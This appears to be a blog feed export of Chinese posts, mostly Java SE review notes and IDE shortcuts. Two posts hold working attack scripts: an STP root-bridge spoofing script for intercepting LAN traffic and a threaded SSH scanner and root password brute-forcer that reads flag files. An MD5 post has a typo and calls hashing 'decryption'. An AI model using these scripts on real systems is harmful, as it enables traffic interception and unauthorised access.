Null是空常量，不能调用任何方法，否则会出现空指针异常，Null可以给任意引用数据类型赋值。 注意事项： 1、以后比较字符串时最好都用equals，因为equals比较的是内容，而==号比较的时后，有时比较的是地址值 2、使用equals时，有常量就用常量对象的equals方法，尽量不用变量对象的equals方法，因为变量对象的值有可能时null，调用equals方法会出现空指针异常 String类的获取功能 .length() 获取字符串长度(字符个数) 例子：&quot;我&quot;.length() 为1 ps：数组中的length是属性，而String中的是对象方法 .charAt() 获取指定索引的字符 .indexOf() 返回字符 或 字符串在此字符串中第一次出现的索引 如果不存在返回-1 如果查找的是字符串，返回索引就是查找字符串第一个字符的索引 .indexOf(,) 与上面不同的是在某个位置之后查找 .lastIndexOf() 从后向前找 .substring() 从指定位置开始截取字符串，默认到末尾 .substring(,) 与上不同的是自己指定了截取字符串的尾部位置并且，包含头不包含尾部 注意：截取字符串之后需要用一个变量来保存，因为substring是不会改变原来的值的。 GBK码表的特性 1、中文是两个字节组成 2、中文字节的第一个字节一定是负数 String类的类型转换功能 .getBytes() 把字符串转换成字节数组，这是一个编码的过程：把我们看的懂的编码成计算机看得懂的 .toCharArray() 转换成字符数组 String.valueOf（） 把字符数组转换为字符串，传入一个字符数组，返回一个字符串 注意： 1、传入的数组类型可以是任意类型，并且底层还是由String的构造方法来解码的。 2、此方法可以传入任意object对象，如果传入的是一个对象，那么默认调用对象的toString方法 .toLowerCase() 把字符串转换为小写 .toUpperase() 把字符串转换为大写 ps：String中字符的转换都是按照unicode码表来转换的 String的其他功能 .repleace(被替换的字符串，要替换成的字符串) 字符或字符串替换，不存在则不改变 .trim() 去除首尾空格 .compareTo() 按照字典顺序比较两个字符串]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>String类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Object类]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Object%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[Object类中的常用方法 类名.getClass() 获取这个类对象的字节码 字节码名.getName() 获取类的名称 .equals(对象) 判断调用此方法的对象和传入对象的值是否一样 toString方法 这是object里的方法，默认打印有@的内容(其实是这个对象在堆内存中的地址值)，因为所有类都是默认继承Object类的，所以重写它可以更好的显示属性值。 注：直接打印输出某个对象的引用那么系统默认会直接调用该对象的toString显示属性值，如果该类没有重写toString方法，默认打印该类在堆内存中的地址值。 重写toString代码示例：123public Stirng toString() &#123; return name + "," + age;&#125; equals方法 equals方法默认是比较地址值，然而每个对象的地址值肯定是不一样的，所以如果调用equals方法的对象没有重写equals，那么调用它是无意义的。 重写equals代码演示：12345//重写equals方法public boolean equals(Object obj) &#123; Student s = (Student)obj; return this.name.equals(s.name) &amp;&amp;this.age == s.age; //这里的equals调用的是string里的方法&#125; ==号和equsls的区别（面试可能问道）： 1、==号可以比较基本数据类型，也可以比较应用数据类型，比较基本数据类向的值时比较的是 数据值，比较引用数据类型比较的是地址的值 2、equals只能比较引用数据类型，即比较地址的值，基层还是依赖==号，默认的equal方法没 有意义，但是我们可以重写它使其有意义。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Object类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Idea常用快捷键]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Idea%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[暂时就这些吧 alt+enter 导入包，代码自动修正 alt + / 代码提示 ctrl+Y 删除光标所在行 ctrl+D 复制光标所在行，并且粘贴在它的下面 ctrl+alt+L 格式化代码 ctrl+/ 单行注释 Ctrl+shift+/ 选中行注释，多行注释 alt+ins 自动生成代码，get、set等 alt+shift+上下箭 移动当前代码行]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>idea快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——Eclipse常用快捷键]]></title>
    <url>%2F2019%2F04%2F09%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94Eclipse%E5%B8%B8%E7%94%A8%E5%BF%AB%E6%8D%B7%E9%94%AE%2F</url>
    <content type="text"><![CDATA[常用的应该就这些了 Alt + / 起到提示的作用，功能很强大，忘记代码可以用。 ctrl + n 新建ctrl + shift + f 格式化代码，使代码更简洁 ctrl + / 注释 也可以ctrl + shift + /或\ F3或ctrl + 鼠标点击 查看源码 ctrl + 1 给建议 alt + shift + m 抽取一段代码成方法，省去了复制 alt + shift + r 改名，在改变量是非常好用 shift + alt + s 生成toString Alt+Shift+C 修改函数结构(比较实用,有N个函数调用了这个方法,修改一次搞定) Ctrl+D: 删除当前行 Ctrl+Alt+↓ 复制当前行到下一行(复制增加) Ctrl+Alt+↑ 复制当前行到上一行(复制增加) Alt+↓ 当前行和下面一行交互位置(特别实用,可以省去先剪切,再粘贴了) Alt+↑ 当前行和上面一行交互位置(同上)]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>Eclipse快捷键</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络攻防之——Python实现生成树协议(STP)欺骗攻击]]></title>
    <url>%2F2019%2F04%2F09%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0%E7%94%9F%E6%88%90%E6%A0%91%E5%8D%8F%E8%AE%AE%E6%AC%BA%E9%AA%97%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[何为生成树协议欺骗攻击？ 所谓的生成树协议就是：通过BPDU来选举根桥或者非根桥，且当网络收敛完毕后，根桥会一直发送BPDU来确定下游设备之间的关系 我们要做的就是把自己伪造成根桥，这样这个局域网的流量都走我们的攻击机过啦。 代码示例 12345678910111213#!/usr/bin/pythonfrom scapy.all import *//01:80:c2:00:00:00这个是一个组播地址eth = Dot3(dst="01:80:c2:00:00:00", src="自己的MAC地址")llc = LLC()stp = STP(rootid=0, rootmac="自己的MAC地址", bridgeid=0, bridgemac="自己的MAC地址")pkt=sendp(eth/llc/stp,inter=2,loop=1)]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>网络攻防</tag>
        <tag>生成树协议欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_内部类]]></title>
    <url>%2F2019%2F04%2F08%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%86%85%E9%83%A8%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[内部类的概述 内部类就是在一个类中定义的另一个类。 ps：刚开始学java对于内部类用到的着实不多，但随着编程能力的提高，我们会领悟到它魅力的所在 内部类的分类成员内部类 它定义在一个类的内部 局部内部类 它定义在一个方法或者一个作用域内部，它的访问仅限于方法内或者该作用域内 注意事项： 局部内部类就像是方法里面的一个局部变量一样，是不能有public、protected、private以及static修饰符的 匿名内部类 匿名内部类应该是平时我们编写代码时用得最多的，在编写事件监听的代码时使用匿名内部类不但方便，而且使代码更加容易维护 例如：为按钮设置一个监听器12345678new OnClickListener() &#123; @Override public void onClick(View v) &#123; // TODO Auto-generated method stub &#125;&#125; 静态内部类 它是定义在另一个类里面的类，只不过在类的前面多了一个关键字static 内部类的面试题之 —— 内部类能不能访问外部类成员变量？ 答（成员内部类）： 内部类可以访问外部类的成员变量，因为编译器底层在创建成员内部类时，为成员内部类加上了指向外部类的引用 示例： 12外部类.this.成员变量外部类.this.成员方法 ps：虽然内部类访问外部类可以随心所欲，但是外部类想要访问内部类就需要创建内部类实例然后利用对它的引用进行访问了 例子： 1234567891011121314151617181920class Circle &#123; private double radius = 0; public Circle(double radius) &#123; this.radius = radius; getDrawInstance().drawSahpe(); //必须先创建成员内部类的对象，再进行访问 &#125; private Draw getDrawInstance() &#123; return new Draw(); &#125; class Draw &#123; //内部类 public void drawSahpe() &#123; System.out.println(radius); //外部类的private成员 &#125; &#125;&#125; 匿名内部类访问外部类成员底层实现原理： 我们用一段代码来举例：1234567891011121314public class Test &#123; public static void main(String[] args) &#123; &#125; public void test() &#123; final int a = 10; new Thread()&#123; public void run() &#123; System.out.println(a); &#125;; &#125;.start(); &#125;&#125; 当test方法调用，系统会给内部类自动加上构造器（这也就是为什么匿名内部类不能有构造方法的原因），这个构造器含有两个参数，一个指向外部类对象的引用，一个是int类型变量，这个int类型变量就是外部类中那个int变量的拷贝，它的值也就是10，同理如果是一个引用数据类型的话，那就是一个在堆内存中的地址值。这样就解决了生命周期的问题 但是还有一个数据不一致的问题，如果内部类或者外部类修改了这个变量的值，那么对方是不可能知道的，所以造成了数据不一致的问题。 数据不一致问题的解决方法就是直接给变量修饰一个final，这就是为什么匿名内部类访问外部类中的变量时，这个变量一定要final修饰的原因 在jdk8之前，局部内部类访问外部类成员变量，那么外部类的那个变量就需要用final修饰 jdk8新特性 局部内部类与匿名内部类访问外部类成员变量，外部类那个变量不需要final修饰了，但其实只是个“语法糖”，只要有对这个成员变量修改的操作，还是会强制要求final修饰的。 匿名内部类 格式： 12345//如果是类那么就代表继承这个类，是抽象类那么就是实现这个抽象方法new 类名或者抽象类名() &#123; &#125;.方法名（）//.方法名()可有无，只是加上可以直接调用匿名内部类中的方法 解释： 可以吧new 到 } 的代码看作创建的一个子类对象实例，所以后面可以.方法名调用 好处： 可以不用声明一个类了，而且把代码都集成到了一起，可以使代码更加简洁。 注意事项： 1、匿名内部类只针对重写一个方法使用，如果要一次性重写多个方法的话不使用，因为调用一次就要创建一次对象，这样就没必要使用匿名内部类了，如果要多次使用则重新定义类。 2、匿名内部类可以当作参数传递，本质是把匿名内部类看作一个子类对象。 3、匿名内部类中不能定义构造函数。 4、使用匿名内部类时，我们必须是继承一个类或者实现一个接口，但是两者不可兼得，只能继承一个类或者实现一个接口。 5、匿名内部类中不能存在任何的静态成员变量和静态方法。 6、匿名内部类属于局部内部类，所以局部内部类所有限制都在匿名内部类上生效 7、匿名内部类不能是抽象的，它必须实现继承的类或者接口中的抽象方法 链式编程： 特点： 调用方法后还能调用方法，也就是说调用第一个方法之后返回的是一个对象。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>内部类</tag>
        <tag>匿名内部类</tag>
        <tag>链式编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络攻防之——Python实现MD5加密]]></title>
    <url>%2F2019%2F04%2F08%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0MD5%E5%8A%A0%E5%AF%86%2F</url>
    <content type="text"><![CDATA[代码示例 123456789101112#!/usr/bin/python3import hashilbstr = input(“请输入要解密的字符串：”)md5 = hashlib.md5()//创建MD5加密对象md5.update(str.encode("utf-8"))//把字符串以“utf-8”编码的形式传给MD5对象进行MD5加密print(md5.hexdigest())//获取MD5加密后的16进制输出打印]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>MD5加密</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络攻防之——Python实现ssh端口扫描并爆破]]></title>
    <url>%2F2019%2F04%2F08%2F%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E4%B9%8B%E2%80%94%E2%80%94Python%E5%AE%9E%E7%8E%B0ssh%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%B9%B6%E7%88%86%E7%A0%B4%2F</url>
    <content type="text"><![CDATA[实现步骤 1、循环遍历出所有网段ip2、利用多线程多并发同时探测22端口3、把探测出来的存活机进行密码爆破4、爆破成功则去拿到主机文件并保存ip、密码等信息5、爆破不成功则记录该ip，进行后续操作。 代码示例 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#!/usr/bin/python3import threadingimport pexpectfrom socket import *key = [pexpect.TIMEOUT, "#", "\$", "&gt;", "&gt;&gt;&gt;", "&amp;"]loginKey = [pexpect.TIMEOUT, "[p|P]assword", "yes"]def getFlag(p, ret): p.sendline("cat ../../../../flag") p.expect(key) ret += " flag:\n" + str(p.before) print(ret) file = open("flag.txt", "a+") file.write(ret) file.close()def getPass(ip, passwd): p = pexpect.spawn("ssh root@" + ip, timeout=1) try: b = p.expect(loginKey) if b == 1: p.sendline(passwd) b = p.expect(key) if b &gt; 0: getFlag(p, ip + " passwd:" + passwd) return 1 except: pass finally: p.close() return 0def scan(ip): s = socket(AF_INET, SOCK_STREAM) s.settimeout(1) try: s.connect((ip, 22)) b = True for n in open("passwd"): passwd = n.strip(); if getPass(ip, passwd) == 1: b = False break if b: file = open("ip.txt", "a+") file.write(ip + "\n") file.close() except: pass finally: s.close()for n in range(1, 255): for nn in range(1, 255): ip = "192.168." + str(n) + "." + str(nn) while True: if len(threading.enumerate()) &lt; 255: break threading.Thread(target=scan, args=(ip,)).start()]]></content>
      <categories>
        <category>网络攻防</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>python</tag>
        <tag>ssh</tag>
        <tag>爆破</tag>
        <tag>端口扫描</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_包与权限修饰符]]></title>
    <url>%2F2019%2F04%2F07%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%8C%85%E4%B8%8E%E6%9D%83%E9%99%90%E4%BF%AE%E9%A5%B0%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[包的意义 我们以后开发程序都是把源码写在一个个的源文件里面，而不是在一个文件中创建很多的类，包的用处就在这里，说白了包就是为了封装。 定义包的格式12package 包名;多级包用“.”分开 例子： 1package java.util.Scanner; 在这里当然也可以把Scanner用*代替，*就是通配符，表示该目录下的所有包，但是效率没有导入具体的类高，因为需要遍历该包所有类。 ps：在开发中一般都不使用，而是导入具体的类。 定义时的注意事项 1、必须是程序的第一条可执行语句2、package在一个java文件中只能有一个3、包名的格式为域名倒写 例：com.aikan0.add这个add就是这个包的作用。 生成包命令1javac -d . 源文件名 ps：了解一下就好了 面试题——package、import、class有没有顺序关系？ 解答： 有，并且package &gt; import &gt; class 权限修饰符 四种权限修饰符 本类 同一个包下(子类和无关类) 不同包下(子类) 不同包下(无关类) private Y 默认 Y Y protected Y Y Y public Y Y Y Y ps：protected表示受保护的，就是保护权限只给给自己的子类，一般不用在变量，而是用在成员变量或者成员方法。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>包</tag>
        <tag>权限修饰符</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_接口]]></title>
    <url>%2F2019%2F04%2F07%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8E%A5%E5%8F%A3%2F</url>
    <content type="text"><![CDATA[接口概述 从狭义的角度讲就是指java中的interface 从广义的角度讲对外提供规则的都是接口 特点： a : 接口用关键字interface表示 1interface 接口名 &#123;&#125; b : 类实现接口用implements表示 1class 类名 implements 接口名 &#123;&#125; c : 接口不能实例化 那么，接口如何实例化呢? 答：按照多态的方式来实例化。 d : 接口的子类 a : 可以是抽象类。但是意义不大。b : 可以是具体类。要重写接口中的所有抽象方法。(推荐方案) 注意事项： 1、接口中的成员变量默认都是常量，他会自动加public static final关键字，并且可以互相交换位置，新手平时都手动给出。 2、接口中没有构造方法 3、接口是干爹，不是亲爹，子类不能用super访问父类中的内容，子类默认继承object类 4、接口中不能定义非抽象方法 5、类与接口是实现关系而非继承关系（干爹） 6、同一个类可以实现多个接口 例子：1class Deom implements InterA,InterB &#123;&#125; 8、接口不能实现接口（implements），但是却可以继承（extends） 类 与 接口的关系 a : 类与类： 继承关系,只能单继承,可以多层继承。 b : 类与接口： 实现关系,可以单实现,也可以多实现。并且还可以在继承一个类的同时实现多个接口。 c : 接口与接口： 继承关系,可以单继承,也可以多继承。 抽象类 与 接口的区别： 抽象类： 和普通的类差不多，只是可以定义抽象方法而已 接口： 成员变量：只可以常量成员方法：只可以抽象 设计理念区别（重要）： 抽象类： 定义的是该继承体系的共性功能 例：每个学生都需要学习 接口： 定义的是该继承体系的扩展性功能 例：每个学生在学校的学习方式都不一样，这样就需要扩展 设计理念区别： 接口是对动作的抽象，抽象类是对根源的抽象。 抽象类表示的是：这个对象是什么。 接口表示的是：这个对象能做什么。 比如：男人，女人，这两个类，他们的抽象类是人。说明：他们都是人，他们的根源就是人 又比如：人可以吃东西，狗也可以吃东西，可以把“吃东西”定义成一个接口，然后让这些类去实现它。说明：他们都可以吃东西，他们的根源是不同的，但是做的动作却相同的。 结论 在高级语言上，一个类只能继承一个类（抽象类）(正如人不可能同时是生物和非生物)，但是可以实现多个接口(吃饭接口、走路接口)。 当关注一个事物的本质的时候，用抽象类； 当关注一个要做的动作的时候，用接口。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>接口</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_抽象类]]></title>
    <url>%2F2019%2F04%2F07%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E6%8A%BD%E8%B1%A1%E7%B1%BB%2F</url>
    <content type="text"><![CDATA[抽象类 关键字：abstract 12abstract class 类名 &#123;&#125; //抽象类public abstract void eat(); //抽象方法 特点： 1、抽象类不一定有抽象方法，有抽象方法的类一定是抽象类或者是接口 2、抽象类不能实例化，但可以通过多态（子类）来说实现实例化 3、abstract强制子类重写 抽象类的几个问题： 1、为什么不直接定义空方法？ 解答：抽象类可以正确的引导使用者正确使用它们，减少被误用 2、抽象类有什么作用？ 解答：增强程序的扩展性和兼容性，规范编程 抽象类中的面试题： 1、一个抽象类可以没有抽象方法，抽象类的意义是防止别人创建这个类的对象（抽象类不能被实例化） 2、abstract不能和static共存 原因：static让这个方法是静态方法，而静态方法可以用类名.方法名调用，而静态方法可以类名.方法名调用的底层原因是这个方法的对象已经在程序运行时就被创建，并且存到静态区域了，但是抽象方法是抽象的，不是具体的，所以它不能被实例化，进而abstract不能和static共存。 3、abstract不能和final共存 原因：abstract强制子类重写，而final表示最终的，它不让子类重写，这里形成了冲突。 4、abstract不能和private共存 原因：abstract强制子类重写，而private让子类访问不到，所以它们两个修饰符形成了冲突。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>抽象类</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_多态]]></title>
    <url>%2F2019%2F04%2F07%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E5%A4%9A%E6%80%81%2F</url>
    <content type="text"><![CDATA[多态前提 a : 要有继承关系。 b : 要有方法重写。 c : 要有父类引用指向子类对象。 例有一个父类fu和一个子类zi，那么父类引用子类对象为： 1fu a = new zi(); 成员变量 编译、运行看左边(父类) 也就是创建对象后，子类引用对象就优先调用子类(这样就不是多态了，因为它没有父类引用子类对象)，父类引用对象就优先调用父类（编译运行看左边） 解析：创建对象时，首先在堆中创建子类的对象（this），而这个子类的对象中有一个区域指向super，如果引用这个对象的是父类那么这个引用指向super区域，否则指向this区域 成员方法 编译看左边(父类)、运行看右边(子类)。动态绑定 ps：父类中一定要有和子类一样的方法，父类中的那个方法可以理解为一个跳板跳转到子类中的方法中。 静态成员方法 与成员变量同理，编译、运行看左边(父类)，所以多态中静态方法不存在重写 多态的弊端 父类引用不能使用子类特有的属性和行为，但是能通过1zi b = (zi)a; //强转类型 多态的好处 1、提高了代码的维护性(继承保证) 2、提高了代码的扩展性(由多态保证) 多态的使用 1、开发是很少在创建对象的时候使用多态，而是直接创建子类引用子类对象 2、在需要使用方法使代码简洁时，当做参数使用多态效果最好，因为扩展性强 比如：现有三个类“动物”“狗”“猫”动物是父类，当我们有很多只狗和猫需要跑时，就可以使用方法函数来使代码简洁，在调用这个方法时可以创建好一个 狗 或 猫 的对象然后传给参数，这就需要使用到多态了，如果不使多态那么就需要给狗和猫分别创建一个函数。 不过在方法中使用多态还有一个问题：狗 和 猫 都有各自特有的功能与属性，如果调用猫的功能，但是传入的对象是狗，那么就出错了。 解决方法：关键字 instanceof ps：了解一下，开发中用到的不多，一般都用到方法重写 代码实例：12对象变量A instanceof 对象变量B//如果是相同的类返回true 多态中的代码分析123456789101112131415161718192021222324252627282930class A &#123; public void show() &#123; show2(); //这里调用的是子类中的show方法 &#125; public void show2() &#123; System.out.println("我"); &#125;&#125;class B extends A &#123; public void show2() &#123; System.out.println("爱"); &#125;&#125;class C extends B &#123; public void show() &#123; super.show(); &#125; public void show2() &#123; System.out.println("你"); &#125;&#125;public class Test2DuoTai &#123; public static void main(String[] args) &#123; A a = new B(); a.show();//返回一个爱 B b = new C(); b.show(); &#125;&#125; 得出结果： 在多态中，父类中的方法调用另一个方法，且被调用的方法都存在于子类与父类中的情况下，优先调用子类的方法，也就是父类方法成为了一个跳板，跳转到了子类的方法中 还是那句话： 成员方法编译看左边(父类)、运行看右边(子类) 成员变量编译看左边(父类)、运行看左边(父类)]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>多态</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——面向对象_代码块与继承]]></title>
    <url>%2F2019%2F04%2F06%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1-%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%8E%E7%BB%A7%E6%89%BF%2F</url>
    <content type="text"><![CDATA[一、静态方法与静态变量静态方法 如果一个类中所有方法都是static静态的，那么需要在类中声明私有构造方法，目的是不让其他类创建本类对象 如何防止创建本类对象？ 可以直接私有构造方法 private 类名（）{} 如何创建一个静态方法？ 在方法中加static修饰，那么这个方法是静态方法（函数） 在载入类的时候就这个方法就已经在类的静态区创建，不需要创建对象即可调用 静态变量 在变量前加入static那么这个变量是静态变量，与上同理，不过这个变量是共享的。 比如 第一条命令给这个变量赋值“张三” 第二条命令又给这个变量赋值“李四” 那么之后调用这个变量时，这个变量返回“李四” 二、构造方法 与 代码块构造方法 构造方法和类名相同，在创建这个类的对象的时候系统就会自动调用，也就是起到初始化的效果 系统会自动创建空参构造，顶层的类系统自动继承object类，但是object类的构造方法没有任何输出 代码块局部代码块 它在方法中出现；它可以限定变量生命周期，及早释放，提高内存利用率 构造代码块 (初始化块) 构造代码块可以在一个类中执行，执行完就弹栈， 例： 1class Deom&#123; &#123;这就是构造代码块&#125; &#125; ps：每次创建这个类的对象构造代码块就会执行一次，并且优先执行 构造代码块可以把一些初始化的代码放在其中，每次调用构造都执行，并且在构造方法之前执行 ps：实际上构造方法开发中用到的不多，但是面试可能会问 构造代码块可以做的功能： 我们可以做诸如统计创建对象的次数等功能。 静态代码块 例： 1static &#123;&#125; 作用： 用于给类进行初始化，在加载的时候就执行，并且只执行一次。 一般用于加载驱动，一般情况下，如果有些代码需要在项目启动的时候就执行，这时候就需要静态代码块。 比如一个项目启动需要加载的很多配置文件等资源，我们就可以都放入静态代码块中。 注意事项： 1、静态代码块不能访问普通变量 2、静态代码块在 类 中，优先于主方法（面试题） 3、静态代码块 &gt; 构造代码块 &gt; 构造函数（方法）&gt; 普通代码块 类的继承 ps：继承与升级一般都用作系统升级 父类 &gt; 子类 继承的定义 class 子类(当前类) extends 父类(继承的类) ps：继承后调用子类等于调用父类，子类可以什么都不写，可以理解为：继承后子类相当于有了父类的方法 继承的好处： 1、可以提升代码的复用性，不需要打太多重复的代码 2、提升了代码的维护性，改一个代码就可以起到全局的作用，不容易出错 3、是多态的前提 继承的弊端： 1、耦合性非常强，父类有的一些属性可能是子类不需要的 开发原则： 高内聚、低耦合 耦合：类与类的关系 内聚：自己完成某件事的能力 在java中继承的特点： 1、Java只支持单继承不支持多继承（一个孩子只能有一个爹） 2、可以多层继承（继承体系），也就是可以继承爷爷 3、想看这个体系所有功能就看最底层类，也就是儿子类 4、想看这个体系共性功能就要看顶层类，也就是爷爷类 注意事项 1、子类只能继承父类所有非私有的成员（方法和变量） 2、子类不能继承父类的构造方法，因为构造方法必须和类名一样，而继承是不一样的，但可以通过super关键字去访问父类的构造方法 3、不要为了部分功能而去继承，因为继承体现的是一种关系，就算有相同属性也不一定继承。 比如：“猫”和“狗”的类，它们虽然都有4条腿，但是却不能继承，因为他们是同级关系，而不是父子关系，但比如有“动物”“猫”“狗”的类，那么“猫”和“狗”都可以继承“动物”的类。 4、子父类如果出现相同变量那么会采取就近原则，但是在真正的项目开发中不会出现这种情况，因为没有意义 5、子类无论如何都会访问父类中的构造方法 6、在全是静态方法的类中，构造方法必须私有化，这样防止别人创建这个类的对象 this和super this： 代表当前对象的引用，如果继承了父类，那么也可以引用父类 super： 代表对父类的引用 一些使用实例： this.成员变量名 调用本类成员变量，也可以调用父类的，但是采用就近原则 super.成员变量名 调用父类的成员变量 ps：成员变量名可以是方法名 调用父类中的构造方法: 1super(...); 调用本类中的构造方法: 1this(...); ps：一个方法里只能调用其中的一个 注意事项 类中的构造方法系统都自带super()；但是被隐藏了，作用是访问父类的空参构造，如果父类没用空参构造，我们需要访问父类中的有参构造，那么就可以super（参数1，参数2....）；也可以用this调用本类的有参构造，进而间接调用父类有参构造 构造方法的调用都是从上到下，即从父类调用到子类，可以理解为一个队列 继承中的面试 1、假设有 子类方法、子类、父类 且其中都有一个num的变量，那么：num用方法中的变量，this.num调用本类中的变量，super.num调用父类中的变量 2、在继承中不要忘记了每个构造方法都会有一个super（）；访问父类 3、override 重写：子类中出现了和父类中方法声明一模一样的方法。与返回值类型有关,返回值类型是一致的 4、overload 重载：本类中出现的方法名一样，参数列表不同的方法。与返回值类型无关。 继承中的成员方法关系 、子、父类有相同方法并且返回值类型也一样，那么会调用子类的方法，也叫方法重写 final概述 它可以用来修饰 类与变量 修饰之后表示它是“最终的”不能被继续操作了 final修饰特点 修饰类，类不能被继承 修饰变量：变量就变成了常量，只能被赋值一次，通常与public static配套使用 修饰方法：方法不能被重写，表示最终方法。]]></content>
      <categories>
        <category>JavaSE 复习</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
        <tag>代码块</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javaSE复习之——java的五大内存区域]]></title>
    <url>%2F2019%2F04%2F05%2FjavaSE%E5%A4%8D%E4%B9%A0%E4%B9%8B%E2%80%94%E2%80%94java%E7%9A%84%E4%BA%94%E5%A4%A7%E5%86%85%E5%AD%98%E5%8C%BA%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[五大内存区域 堆 虚拟机栈 本地方法栈 方法区 寄存器区 ps：我们主要用：虚拟机栈、方法区、堆 Java程序运行过程 1、加载字节码文件到方法区（.class文件） 2、程序代码依次进栈（jvm执行main方法） 堆（heap）： 最大的一块内存，存放对象实例的地方 1、Java堆是垃圾收集器管理的主要区域，也称GC堆。 2、Java堆物理上可不连续，逻辑上连续。 3、堆中没有完成实例分配，并且对也无法在扩展时抛出 OutOfMemoryError异常 虚拟机栈（stack）： java方法执行时的内存模型 栈帧 1、每个方法都会在虚拟机栈中创建一个对应的栈帧，用于存储局部变量表，操作数栈，动态链接，方法出口等信息。 2、一个方法的调用到结束就对应这一个栈帧从虚拟机栈入栈到出栈。 局部变量表 1、存放编译期可知在方法中各种基本数据类型和对象的引用，基本数据类型直接存值, 引用数据类型存地址。 #本地方法栈： 本地方法栈和虚拟机栈作用相似，虚拟机栈为虚拟机执行java方法（字节码）服务，本地方法栈为jvm使用Native方法服务 本地方法 关键字 native ，这些方法一般用来调用本地方法库中的方法这些方法，操作底层大多用C 实现。 有的虚拟机将本地方法栈和虚拟机栈合在一起，如HotSpot。 方法区： 存已经被虚拟机加载的类信息（Class对象）、常量、静态变量、即时编译器JIT编译过后的代码数据。 jdk 1.7、1.8 对方法区做出了修改，1.8 取消了方法区。 1、方法区被Java虚拟机规范描述为堆的一个逻辑部分，但它不是堆，有一个别名叫非堆Non-Heap 2、 jdk1.6 及之前方法区位于永久代(PermGen)，永久代和堆相互隔离。 3、方法区可以不需要连续的内存空间，也可以固定大小，也可以扩展，也可以不实现垃圾收集，如果实现则主要针对常量池的回收和类型的卸载。 运行时常量池 1、在方法区，用来存放编译期生成的各种符号引用和字面量 2、编译期将各种符号引用和字面量放置在class文件的常量池中，解析后在运行时常量池，字符串在方法区的字符串常量池中（1.7之前），方法运行时复制到局部变量表中。1.7开始字符串常量池被移入堆中。 符号引用： String ss = “asdsfg” ss这个符号就是符号引用。解析阶段解析为直接引用 字面量： 值本身 如 asdfg 常量池中有各种虚拟机正常运行需要的字符串，所以有些即使不创建也还会存在于字符串常量池中如”java”。 寄存器（程序计数器）： 